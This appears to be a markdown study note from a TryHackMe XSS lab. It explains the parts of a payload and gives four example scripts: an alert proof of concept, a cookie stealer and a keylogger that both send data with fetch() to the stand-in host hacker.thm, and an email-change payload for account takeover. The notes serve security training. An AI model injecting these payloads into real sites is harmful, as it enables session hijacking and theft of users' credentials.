# [XSS Payloads](https://tryhackme.com/room/xssgi)

## What is a Payload?

- In XSS, the payload is the ***JavaScript code*** we wish to be executed on the targets computer. There are two parts to the payload, **<ins>the Intention and the Modification</ins>**.


- `The intention` is what you wish the JavaScript to actually do (some examples below), and `the modification` is the changes to the code we need to make it execute as every scenario is different.


## Here are some examples of XSS intentions 
- See all below mentioned scripts [here](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/tree/main/04%20-%20XSS%20Payloads/Payload%20List)

### 1. Proof of Concept (PoC)

- This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an ***alert box*** to pop up on the page with a string of text, for example:

  [<script>alert('XSS');</script>](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/04%20-%20XSS%20Payloads/Payload%20List/1.%20POC.js)

### 2. Session Stealing

- Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, **base64** encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.


  [<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/04%20-%20XSS%20Payloads/Payload%20List/2.%20SessionStealing.js)
  
### 3. Key Logger
  
- The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted **user logins or credit card details**.
  
  [<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/04%20-%20XSS%20Payloads/Payload%20List/3.%20KeyLogger.js)
  
### 4. Business Logic

- This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

  [<script>user.changeEmail('attacker@hacker.thm');</script>](https://github.com/ShubhamJagtap2000/Cross-site-Scripting/blob/main/04%20-%20XSS%20Payloads/Payload%20List/4.%20BusinessLogic.js)

- Now that the email address for the account has changed, the attacker may perform a reset password attack.
